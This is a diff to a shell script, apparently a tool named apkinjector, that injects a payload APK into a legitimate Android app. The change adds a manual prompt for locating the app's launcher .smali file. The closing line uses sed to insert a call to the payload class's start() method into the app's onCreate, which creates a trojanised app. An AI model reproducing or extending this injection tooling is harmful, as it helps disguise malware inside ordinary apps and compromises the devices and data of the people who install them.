@@ -61,13 +61,21 @@ sed -i 's/\./\//g' /tmp/output_1
 sed -i 's/[ \t]*$//' /tmp/output_1
 launcherSmali=`cat /tmp/output_1`.smali
 if [ \! -s /tmp/output_1 ]; then 
+    echo; echo
+    echo "Running grep -B 7 -A 2 MAIN /tmp/original/AndroidManifest.xml"
+    echo "This is to assist in manually finding the smali file to inject into"
+    echo ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    # a little visual aid to find the .smali file easily without manually navigating
+    grep -B 7 -A 2 MAIN /tmp/original/AndroidManifest.xml 
+    echo ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    echo;echo
     echo -e "\033[31m Was unable to locate the .smali launcher in AndroidManifest.xml with the current grep command in place \x1B[0m"
-    echo "Checkout line 57 in apkinjector"
-    echo "Also verify the command given was 'apkpayload <payload>.apk <original>.apk'
-    echo "Look for the MAIN function in AndroidManifest.xml located in /tmp/original. The .smali file used in that section is the line you want to grab"
-    exit 1
+    echo "Locate MAIN/LAUNCHER functions in /tmp/original/AndroidManifest.xml. Above you will find the path to the .smali file"
+    echo "Example: com/path1/path2/MainActivity.smali"
+    read -p 'Location of MAIN/LAUNCHER .smali file: ' launcherSmali
+else
+    echo -e "\033[32m Found smali launcher in AndroidManifest.xml: $launcherSmali \x1B[0m"
 fi
-echo -e "\033[32m Found smali launcher in AndroidManifest.xml: $launcherSmali \x1B[0m"
 
 #add injection to smali file
 sed -i "/onCreate(Landroid/ainvoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V" /tmp/original/smali/$launcherSmali
